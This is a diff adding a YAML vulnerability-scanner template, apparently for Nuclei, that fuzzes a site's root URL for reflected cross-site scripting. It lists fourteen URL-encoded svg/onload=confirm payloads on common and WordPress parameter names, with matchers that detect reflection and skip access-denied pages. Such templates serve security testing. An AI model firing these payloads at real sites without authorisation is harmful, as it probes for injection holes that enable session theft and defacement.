@@ -1,0 +1,59 @@
+id: poc-yaml-fuzz-testing-xss-1
+info:
+  name: 模糊测试1 XSS漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: xss
+variables:
+  payloads:
+    - "u=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-u%27%29%3E"
+    - "groups=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-groups%27%29%3E"
+    - "signup_for=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-signup_for%27%29%3E"
+    - "user_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-user_id%27%29%3E"
+    - "type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-type%27%29%3E"
+    - "desc=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-desc%27%29%3E"
+    - "newcontent=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-newcontent%27%29%3E"
+    - "foo=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-foo%27%29%3E"
+    - "message=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-message%27%29%3E"
+    - "d=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-d%27%29%3E"
+    - "width=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-width%27%29%3E"
+    - "_wp_http_referer=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-_wp_http_referer%27%29%3E"
+    - "post_status=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_status%27%29%3E"
+    - "author=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-author%27%29%3E"
+http:
+  - method: GET
+    path:
+      - "/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        part: header
+        words:
+          - "text/html"
+  - method: GET
+    path:
+      - "/?{{payloads}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        part: body
+        words:
+          - "'>\"<svg/onload=confirm('xss-"
+      - type: word
+        part: header
+        words:
+          - "text/html"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<title>Access Denied</title>"
+          - "You don't have permission to access"
